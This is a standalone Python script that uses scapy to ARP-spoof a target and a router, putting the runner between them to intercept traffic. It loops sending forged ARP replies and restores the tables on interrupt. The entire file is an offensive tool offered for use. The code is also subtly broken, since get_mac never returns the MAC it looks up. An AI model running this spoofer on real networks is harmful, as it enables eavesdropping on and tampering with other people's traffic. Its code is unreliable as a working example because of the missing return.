#! /usr/bin/env python

import scapy.all as scapy
import time
import optparse
import sys

parser=optparse.OptionParser()

parser.add_option("-t","--target",dest="target",help="Enter the target Ip")
parser.add_option("-r","--router",dest="router",help="Enter the Router Ip")

(options,arguments)=parser.parse_args()
target=options.target
router=options.router


def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast=broadcast/arp_request
	respone_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=0)[0]
	respone_list[0][1].hwsrc

def spoofer(target,router):
	mac = get_mac(target)
	packet=scapy.ARP(op=2,pdst=target,hwdst=mac,psrc=router)
	scapy.send(packet,verbose=0)

def stop_spoof(target,router):
	target_mac=get_mac(target)
	router_mac=get_mac(router)
	packet=scapy.ARP(op=2,pdst=target,hwdst=target_mac,psrc=router,hwsrc=router_mac)
	scapy.send(packet,count=4,verbose=0)

i=0
try:
	while True:
	    spoofer(target,router)
	    spoofer(router,target)
	    i+=2
	    print("\r [+] Sent Packets ..."+str(i)),
	    sys.stdout.flush()
	    time.sleep(2)
except KeyboardInterrupt:
	stop_spoof(target,router)
	print("\r[+] Ctrl + C detected..!"),
	print("\r[+] Restoring Ip...!"),
	sys.stdout.flush()
	time.sleep(1.2)
	print("\r Spoofing has stopped..!")